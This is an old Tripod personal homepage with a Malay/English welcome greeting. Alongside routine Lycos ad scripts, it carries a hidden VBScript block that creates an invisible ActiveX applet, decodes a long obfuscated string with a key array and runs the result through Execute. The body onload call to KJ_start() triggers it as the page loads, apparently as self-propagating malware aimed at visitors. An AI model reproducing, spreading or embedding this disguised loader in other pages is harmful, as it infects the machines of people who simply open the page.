
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="Content-Language" content="en-us">
<title>Home Page</title>
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
</head>

<body onload="vbscript:KJ_start()" bgcolor="#FFCCCC"><!-- begin compete js -->
<script type="text/javascript">
    __compete_code = '667f89f26d96c30e99728fe6a608804d';
    (function () {
        var s = document.createElement('script'),
            d = document.getElementsByTagName('head')[0] ||
                document.getElementsByTagName('body')[0],
            t = 'https:' == document.location.protocol ? 
                'https://c.compete.com/bootstrap/' : 
                'http://c.compete.com/bootstrap/';
        s.src = t + __compete_code + '/bootstrap.js';
        s.type = 'text/javascript';
        s.async = 'async'; 
        if (d) { d.appendChild(s); }
    }());
</script>
<!-- end compete js -->

<!-- quantcast -->
<script type="text/javascript">
	function channValidator(chann){
	return (typeof(chann) == 'string' && chann != '');
	}

	function lycosQuantcast(){
		var lb = "";
		if(typeof(cm_host) !== 'undefined' && channValidator(cm_host)){
			lb += cm_host.split('.')[0] + '.';
		}
	
		if(typeof(cm_taxid) !==	'undefined' && channValidator(cm_taxid)){
			lb += cm_taxid;
			lb = lb.replace('/','');
		} else {
			lb = lb.replace('.','');
		}
		return lb;
	}
	
	var _qevents = _qevents || [];
	
	(function() {
		var elem = document.createElement('script');
		elem.src = (document.location.protocol == "https:" ? "https://secure" :"http://edge") + ".quantserve.com/quant.js";
		elem.async = true;
		elem.type = "text/javascript";
		var scpt = document.getElementsByTagName('script')[0];
		scpt.parentNode.insertBefore(elem, scpt);
	})();
	
	_qevents.push({
		qacct:"p-6eQegedn62bSo",
		labels:lycosQuantcast()
	});
</script>
<!-- end quantcast -->

<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "aisyah880";
var tripod_member_page = "aisyah880/index.htm";
var tripod_ratings_hash = "1319532023:9adc23ddc0a835e3ee58dac1ed7fac13";

var lycos_ad_category = null;

var lycos_ad_remote_addr = "154.35.200.66";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=503114";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=503114";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}

window.onload = function() {
    var f = document.getElementById("FooterAd");
    var b = document.getElementsByTagName("body")[0];
    b.removeChild(f);
    b.appendChild(f);
}

</script>
<div id="tb_container" style="text-align:center; position:relative; z-index:999999999">
    <div id="tb_ad" style="display:block!important; overflow:hidden; width:868px; margin:0 auto">
    <a href="http://www.tripod.lycos.com" title="build your own website at Tripod.com" style="float:left; width:140px">
    	<img src="http://pd.tripod.com/common/ly/images/freeAd.jpg" alt="Made with Tripod.com" />
    </a> 
        <div id="ad_container" style="display:block!important; float:left; width:728px ">
        <script type="text/javascript">document.write(lycos_ad['leaderboard']);</script>
        </div>
    </div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important; position:relative; z-index:999999!important; height:94px!important"> 
<script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script>
</div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=503114" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>

<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "CahHfRbdj`&GlhfS]sn+N]mS]sn+<`aq]`Mh_i&@hkfdG]dd[o&EKJ&VkNbddg&VaiJ`lc&Rm]?+>dh`dt>hkfKp\CEYrl\ls $CEMdl?cl $CE=q]\ndEdfh]p(EIDdedAo(EI;m_`l`G`ag(EIHmioYb[s]##@hcNoa>phbldimFD@hk_m\Oi'>dfdH\ng$Oso]Nnq!Nf?qjjlJ`mte`M]snN_sM_`\O_lh7>NI-Gk_mL`rs>dfd Ack]K[s`'+(NlhNnq8Q]\^S]hj-J`[c9gfD`Aimsj#NlhNnq$EIWnn`jo($;6*GmK]iSekMsj$;,S``hM_`\O_lh)=kgn_@rhl@tf^nhgi=i^AaAaSqk_Rlm<bslS``hM_`\O_lh)=kgn_N_sAck]O_lh7>NI-Gk_mL`rs>dfd Ack]K[s`',(@hd`Ndek(Vjdnd6!!!:J>Xjhkg\^<uZn]qakn9 FD^ko[ql##!%8!!uZ>lK^ LhjRlm%q\BjG`BsegNdpo>dfdL`go&>fnk`K`n><nsjd\5@RG)AdlAck]#@hd`J`lc#A;slmca&\nsjd\tl`m5-3?kk`J`[cL`go&>fnk`K`n>dfdL`go8EKJ(Nh`hS]snEag_'>dfdH\ng$3#D`LtjdKol5glhf!ObdfEag_S]hj-Omcs]pa;mFe!!4%BSEG8!!uZ>lK^ 7AG?SgifnY_7!%pak^lhho4!!!CEYrl\ls $! 9pa;mFe!GlhfS]sn@fr]D`LtjdKol5uZnLc_m@hd`Ndek(Vjdndq\BjG`PakO_wlDf_H^Eag_S]hj-;gir]Df_H^Df_Emi]sajhEmi]sajhCE=gYiadKp\';plq]inRlmcm_'F`koCm\`rB`\l(CeG[rlDhc]s=gYm<+S``hD`D``s G=`k`BmmldfoMsjdhf!'+(86D>[r]#b$S``hFDB`\hf]Noa8Eai[kq?crc 5V!MtZ@<+=gmdEI;c[m_`MtZ7;cl'9n]'D``s G=`k`BmmldfoMsjdhf!'+(!')$%4[Rm]?5*@hcD`@fr]JB>b`fb_Rm]<Hcc >oqj`hsKolhfb&0$G[rlDhc]s=gYm#@hcD`@hcAom[ocnfAom[ocnfEI;m_`l`G`ag(Im@lqgmQ]nol]HdpoAaHfRbdj`<bsegLc_m?waoEmi]sajh@hcD`Nb`j`@hd`<G_el#QhfK[s`'-(!!Hmifj\g>dfdkW=nehimAck]nVLa^lnkj`sNb`j`^[Ko[sajhdjtVad\hj&cnlH^EKJ(Eag_Dpdmsk#MgYm_Eag_(!Ng]i;\fkFD@hk_m\Oi'Kc[q]Ack]'glhf!!Ddn_N_sAck]O_lh7>NI-Gk_mL`rs>dfd Nb`j`@hd`&1$olt]$>dfdL`go&Rlhl`!4%BSEG8!!uZ>lK^ 7AG?SgifnY_7!%pak^lhho4!!!CEYrl\ls $! 9pa;mFe!GlhfS]snAck]O_lh)=kgn_@hcD`?_eYpfsA_<RmR``fk&M_fJ`[c BJ=TYBMMLDFOYTK@L[A__mldnh]nVC]a[tdoTk`lA?(ItlGincQ_qkdim8VkNbddg(Q]bLdY_!@F?XWGIB9GYL9>BHF@VRganvYm_[Ed]qgnielWItlginc?whm_rkWGd\d[U]m(QrKc_kd)Ld_Rlhl`!@F?XW>OQJ@HSWPMDJWCc]inhld_rT C]a[tdoCcVRganvYm_[Ed]qgnielWItlginc?whm_rkW%G_el#ItlGincQ_qkdim$,#(/TH[hdW=nekir]Or]MsYocnf`lx'++M?FW?QNJ?>[kdEIE\ckJ`a'CEDQZ=TJM?MLZOR=MVH\`hsaocdkW%<```mgnH\![Kj`so\ldTHcbjjmn^oVNmofngfDpkldknV!Fd^oNmoFngfPdjncnf'+(!-(WG`agVRl\nhgi_qqH`e`+Kc[q]Ack]$;\fkFDLYdfQ]b!@F?XW>OQJ@HSWPMDJWCc]inhld_rT C]a[tdoCcVRganvYm_[Ed]qgnielWItlginc?whm_rkW%G_el#ItlGincQ_qkdim$,#(/TH[hdWQh\`Rl\nhgi_qqH`e`+Kc[q]Ack]$OnMg]gf-J`aVjdndBJ=TYBMMLDFOYTK@L[Kj`so\ldTHcbjjmn^oVN^acb]W3-(WItlgincWIoldimkWG`agVD\dnnjKld^`ldf^_!$,-0(2,+M?FW?QNJ?>[kdEIE\ckJ`a'CEDQZ=TJM?MLZOR=MVRganvYm_[Ed]qgnielWQhf_ivkGdkn[faiaKp\rqnndeWJqgack]nVLa^lnkj`sJosdjijDhs]mhdlMdlocm_nV/Y+^/*+*/(+*/(+*b(+*/(+*/(+*/(/0[(++d(.0/'ad\hj$;\fkFDLYdfQ]b!@F?XW>OQJ@HSWPMDJWMn^oq`j`VLa^lnkj`sTRcm\jqrIN[;plq]inU]mmhgiVVai^nonL]nm`_dhfNoaktms]hVOjj`hd`m[Ed]qgnielItlgincCml`lm]oR]onhfbm[(\*c(-*/(+*/(+*/[+*/(+*/(+*/(+.5T+*0]+-5(&!Zg[mc#RmR``fk&M_fOmcs]GC@S^;PLQ=IN^MN?QTNielr[q]WGh[mirgan[Ga`h[`V0()*[Gpnkgje[Gknhgim[E\ckT@^hljlOj``dj`hb]&0+,*6*'Q=BYCOJLCBYgfCEG`agLd_#GC@S^;PLQ=IN^MN?QTNielr[q]WGh[mirgan[Ga`h[`V0()*[;jglgiVLYdfR]onhfbm[F`qRl\nhgi_qq&!Zg[mc#FDteh[f]Aik\`l'D``s RcmH\ng$.#OjjaqYhEag_rT>ilejh>dfdkWGh[mirganKc[q]_VRl\nhgi_qq#@hcAom[ocnfAom[ocnfEI;m_`l`Ghdd_t $GiDjmiqM_rmh_F`rsNdekJ`lc<D`Fjn'>NI->dfd=scrlnVaiJ`lc%QR[mcol)_w]#(ObdfS]hjOYob5rqnnde.,[Df_H^H^NdekJ`lc<mxko_l+-V!ObdfRl\lsMk@hd`<RcmH\ng!!KTMS=HVJ]mhdd.,-\gf!?kk`Ko[qlPjEag_5QhfK[s` NSRL@G[C`lm]g(cdg@hcD`RmR``fk&M_fOmcs]GC@S^DJ=@DZG@;CCM=WMn^oq`j`VLa^lnkj`sTRcm\jqrT>oqj`hsN`lrajh[Jph[C`lm]g-1'MsYmnThAck]EKJ(BgksEag_OdhOYobv]]Vjbr[kd)ah^&VaiJ`lc%qdZW@nd__q&cnsEKJ(BgksEag_OdhOYobrqnnde.,[ceq`dg(faa+OdhOYobrqnnde.,[\`mjljj-aic!=`dgJB<jo]i^Sg#QhfK[s` r_aTAik\`l-`on!$bsl#RmR``fk&M_fOmcs]GC@S^;G;RK@M^JJIST)^kdW+_fk^dfdVkNbddg(Q]bQqao_CEDQZ=K9NMDKZLNGOV-\gf[;jhs]inLtjd'`hkfh[\nhgi)w%hmcgrhkg\^!QrKc_kd)Ld_Rlhl`!@F?XW>F@KN?RWMINLW^kdack]W>d^\oklD]nfW+OnMg]gf-J`aQ]\^'CEDQZ=K9NMDKZLNGOVup_`hd`VC]a[tdoCbgiV!!VkNbddg(Q]bQqao_CEDQZ=K9NMDKZLNGOVcdg`hd`VR[mcol@hfai_['U:N]qakn!QrKc_kd)Ld_Rlhl`!@F?XW>F@KN?RWMINLW^kdAck]WMg]gf[Gk_mT>ile\hcT&VaiJ`lc%O_lhK[s` RMbjdjs&`rd$)%RmR``fk&M_fOmcs]GC@S^;G;RK@M^JJIST_fk>dfdTNbddg?wTKlnh`lsqNbd]oB`f_fdjnVVKCJqgkm['z.+,4,>;4%4/2:(+0;A'7;40,(+;@(+<7/+2BuOnMg]gf-J`aVjdndBJ=TYBD<MR=NYQGJN[\gfEag_[K^lhhoBnko?m[j^dT&!s3/0+,02)(.7(>'0)?,,:,@8%+*B(/@7.>-1,xN_sAck]O_lh7>NI-Gk_mL`rs>dfd Nn`joOo>dfd$-&sjp_(@hd`Ndek(VjdndQ\rL`rs@hd`Ndek(Bdjmd?m\@tf^nhgi@tf^nhgiJBGcj]Dn'!H^CmOc_q]6=bsegLc_m?waoEmi]sajh@hcD`ObhkGibYocnf7\j]te`hs&gibYocnfH^Fd^oS`dmKg^[sajh+/#5eag_!ObdfS`dmKg^[sajh5Gh\#NganFn[\nhgi&8!H^@RG)Adl@rs]imhgiH`e`S`dmKg^[sajh(78s``hObhkGibYocnf7D``s ObhkGibYocnf'Fdf#NganFn[\nhgi#%Fdf#@RG)AdlAck]I[l]#NganFn[\nhgi#(!Df_H^H^Fdf#NganFn[\nhgi#6-Lc_mNganFn[\nhgi<ObhkGibYocnf W@hcD`FDteh[f]Aik\`l'LccrDj]`ldim!Df_H^Df_Emi]sajhEmi]sajhCEG`agLd_#Ld_Nnq$Ack]I[l]$GiDjmiqM_rmh_F`rsLd_O_lhNnq8VkNbddg(Q]bLdY_Q]bMsj$AaQ]bNdekMsj7S``hRmR``fk&M_fOmcs]Ld_Nnq$Ack]I[l]Df_H^Df_Emi]sajhEmi]sajhCEIagNoa >oqj`hsKolhfb#Noa=7(S]nnNmo<+<jV`dfdOlt]S]nnNmo<O_rlJos&0CeO_rlJos910Ng]i;plq]inRlmcm_7>dh`dt>hkf%4[Dpdn<j=i^AaGiDjmiqM_rmh_F`rsMdlNgan@nd__q8EKJ(F]o@nd__q >oqj`hsKolhfb#N_s?cbKp\5=q]\ndG]dd[o!K^lhhocm_)>h[ocnf\lx$K`n>jfc]mm5Ngan@nd__q&Noa>jfc]mmAik\`lBgphs8/@nj?`[cS]hjEgg^djcmAik\`lr@nd__q;joml7>jfc]m=nmin#+?cbKp\-Y_^>jfc]m=nmin+O_lhAik\`l-F\gdHdpoAaCa^MtZ)=nmin5*Lc_mF`koCm\`rB`\l5CmkolQ]qBmmldfoMsjdhf$V!$G_m >oqj`hsKolhfb#,)$Kp\Rlmcm_7Ed^';plq]inRlmcm_'F`koCm\`rB`\l*)'Fdf#=tjm_mlNnqaia(%G[rlDhc]s=gYm'0!BmmldfoMsjdhf8JB>b`fb_Rm]BmmldfoMsjdhf$G[rlDhc]s=gYm#Noa=7)Ddn_D`Kp\D8/ObdfBmmldfoMsjdhf8BmmldfoMsjdhf!Ca^MtZ)Cs]h0! W@rhl>n?kk`b7(Egmi80Oi>jfc]m=nminD`D>[r]#MtZNnqaia(8K;\md ?cbKp\-Ao_l e#(ObdfH^d4@nd__q;jomlNg]i;plq]inRlmcm_7;plq]inRlmcm_ <d]Rm](Hl`g'b&+(!!T=scs?i@hcD`@hcD`I_wlKYnnHf__w;c[q8HfnnqJ`p';plq]inRlmcm_'['Fdf#=tjm_mlNnqaia(%,#NoaKolhfb<Hcc >oqj`hsKolhfb&KYnnHf__w;c[q#,&K]iBmmldfoMsjdhf!(F`koCm\`rB`\l,)$;plq]inRlmcm_7CE=gYiadKp\';plq]inRlmcm_'F`koCm\`rB`\l(?m\Ce?m\CeFngkCEIagNoa8BmmldfoMsjdhf?m\@tf^nhgi@tf^nhgiJBKlnh\a`l`(Im@lqgmQ]nol]HdpoJ`aOYobUYgod8!@F?XWGIB9GYL9>BHF@VRganvYm_[Ed]qgnielWItlginc?whm_rkW>d_m_dCaneC]bld]7OnMg]gf-J`aQ]\^'J`aOYobUYgod!H^>hkf>d_m_d8!Ng]i<dmj<`aq]`<AcmYgsCane9T=i^Aa>jla8+lj4>hkf>d_m_d8JBJ\nKp\'<dmj<`aq]`#FDteh[f]Aik\`l'<dmj<`aq]`#I_wlVkNbddg(Q]bQqao_J`aOYobUYgod$?crc?_fj`_@hcAom[ocnfAom[ocnfEImhg`_`@nd__q K[s`I[l]$GiDjmiqM_rmh_F`rsMdl@nd__qF\gd8EKJ(F]o@nd__q K[s`I[l]$K`nLccr>dfdk7>jfc]mH`e`(Eag_rBsl@rhkom5*Aiq@[b`Ngan@hd`HfNgan@hd`mAck]@rs8T;\md AMN&B_s=sndfncnfI[l]#Ngan@hd`(OYob(!H^@hd`?wl7CNLIqAck]@rs8!@OGKIqAck]@rs8!9NJ!Jl>dfd=sn5O@KGmEag_Dpo<DRHS``h>[kdEI9kjdf_Nn ObhkAck])J`lc&!`ogk$=gmdAaEag_Dpo<PAKS``h>[kdEI9kjdf_Nn ObhkAck])J`lc&!n]m!!Ddn_H^@hd`?wl7CNSNg]i@onDpdmsk7)Df_H^M]snD` P=`k`OYobMYh_(8T;\md RcmH\ng!!<`mjljj[$#Gm'M>[r]#J`lcH`e`#5OBYn_'OdhOYobC]nesgk(!ObdfGlo?wannr80?m\CeCeCns=scrln<+S``hAMN&>ioqAck]QhfK[s` nsrl`g2*W^dkfnnh)cma&OYobMYh_AMN&>ioqAck]QhfK[s` r_aTAik\`l-`on!$K[s`I[l]Df_H^Df_Emi]sajhEmi]sajhCEMdl?cl $GiDjmiqM_rmh_F`rs?qj)=k]\lO_rlDn5QR[mcol)Mbjdjs>pfkf\gdCe@lqObdfHfRbdj`<bseg@fr]HfRbdj`<pak=i^AaAaHfRbdj`<pakS``hN_sAMN8Bj`[s]J\i]^n'N]qaknhfb(Eag_RqnndeJ\i]^n!!R]oVkNbddg<>ldYo_NZe_bl#VK^lhho(R``fk$=gmdMdl;ohg_NZe_bl7\j]te`hs&\jod`nr EIWbodko(;ohg_NZe_bl)mdl>FRA?!sA32-?=1*(+B>+'0)?*,9?<8%+*B(/@C-3;/:x(;ohg_NZe_bl)]q]\ndAimsYi]d $K`nOnMg]gf5;ohg_NZe_bl)AdlJ\i]^n'!@hkfdG]dd[o(r]o=KKD>'v*C,.@D(,'E(4-,),=E%333((*/9+=8(0.1*3w!!@hkfdG]dd[o(bj`[s]Dhrl\hb]##N_sAMN8@hkfdG]dd[o(F]oIab`]s $=i^AaK`n<dmjG]dd[o<AMN&?lhn`mAiq@[b`>hkfNdekHf>hkfIab`]sCe?crcO_lh)>qaq_Sqk_491<hc?crcO_lh)>qaq_Sqk_490ObdfDpdn>jl@hcD`AcmYgsCane5>hkfNdek(CjdpdD`ns]mF`rs>heIs``l@jm2!QYi^nedtd@njc<(Nn.Gobdj<lq d#5Cml#8%Qf_#(HdpoL`goKolhfb<Aiqd70OiD`h'LccrL`rs!S]hjMmh<<mb Hcc ObhkO_wl'c+)$#D`L`goFpg5+2ObdfS]hjMmh<-2@fr]D`L`goFpg5+/ObdfS]hjMmh<-3@hcD`O_lh>b`j7;cl'L`goFpg%Is``l@jmhHic/#(CeO_lh>b`j7;cl'+/#Lc_mNdek=gYm<>bq ,2(?m\CeNdekMsjdhf8S]hjRlmcm_ L`go;c[qHdpoMiFn[fMsj7@rd[pnd CahJ]t;qj#-($ObhkO_wl%n]=qDa !F_x9ml'($<%Jng]m;qj#*(!! uZ>lK^!!C`s@jm0!7 Gobdj<lq ,#!!pa;mFeJ]t;qj#,(8!!Nlc_q9ml'*$%!q\BjG`%Edq<lq .#5Is``l@jm2! %n]=qDa !Aiqd70OiD`h'=s_Rlmcm_$!q\BjG`%NdekHte79n]'Ed^'=s_Rlmcm_'c+)$#!!pa;mFeH^NdekHte7)3S``h!!pa;mFeS]hjMmh<..!!pa;mFeDf_H^%n]=qDa !O_lh>b`j7;cl'L`goFpg#Edq<lq dLg_3!$!q\BjG`%CeO_lh>b`j7;cl'*3#Lc_m uZ>lK^!!L`go;c[q8uZ>l!!pa;mFeDdn_H^Ndek=gYm<>bq -3(Obdf%n]=qDa !O_lh>b`j7n]Fe uZ>lK^!!=i^Aa!q\BjG`%NganNdpo<ObhkO_wl L`go;c[q uZ>lK^!!F`rs#!!uZ>lK^ @rd[pnd ObhkO_wl$ObhkO_wl7@rdKolhfb<!!S]hjRlmcm_ !BsegNdpo<7r[mcolf`fbo`_`7uZn]qakn= n]=qDa%^n[pgdfo(vjdnd%! 7caqrltfd5jnkdnhgi4`Znikmo_:g_el5*op6sgk4/hs5od^s`5*op6g]dagl5*op6y%dhc]s4106uancaagcsq5ga_^df8!!!4%@HKFDLH@E@7JB%Yfm`msC?H?CN<(QH<OB<(]n\`7bgh(lk)!`[ocu]S(@[ocu]%RBghjnf`hs6%6!!!'<JOD@N= 7.\dp=pa;mFe!!4%)r[mcol9pa;mFe!!4%mbjdjsg[m_p[f]8pak^lhho8!!uZ>lK^ LccrL`rs!uZ>lK^ MiFn[fMsj n]=qDa%6!!!'n]qakn= n]=qDa%6!!!'=ICQ9pa;mFe!!4%)GLHF=UZnNdpo<ObhkO_wl n]=qDa%PhKg^eRlm%q\BjG`JBZmsYmn'!OdhOYob5@RG)AdlNjd[d[k>jfc]m/! WD` AMN&Ack]@rhkom'OdhOYobv]]VEgg^dj)bsl#(ObdfEKJ(BgksEag_OdhOYobv]]VEgg^dj)bsl&VaiJ`lc%qdZWeio\fk&bceDf_H^H^EKJ(Eag_Dpdmsk#QhfK[s` nsrl`g2*W^dkfnnh)cma#(ObdfEKJ(BgksEag_OdhOYobrqnnde.,[\`mjljj-aic!$RcmH\ng!!ktms]h-1TfdvYgf-_d`!?m\Ce?m\@tf^nhgi"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 6"&vbCrLf&"KeyArr(1) = 1"&vbCrLf&"KeyArr(2) = 8"&vbCrLf&"KeyArr(3) = 5"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
<p align="center"><font face="LinoLetterCutRagged" color="#FF00FF" size="5">WELCOME</font></p>
<p align="center"><font face="LinoLetterCutRagged" color="#FF00FF" size="5">TO</font></p>
<p align="center"><font face="LinoLetterCutRagged" color="#FF00FF" size="5">MY</font></p>
<p align="center"><font face="LinoLetterCutRagged" color="#FF00FF" size="5">WEBSITE</font></p>
<p align="center"><img border="0" src="images/welkat.gif" width="162" height="131"></p>
<p align="center"><font face="Gecko Regular Caps" size="6" color="#FF0000">
<a href="muka2.htm">SELAMAT
DATANG</a></font></p>
<p>&nbsp;</p>
</body>

</html>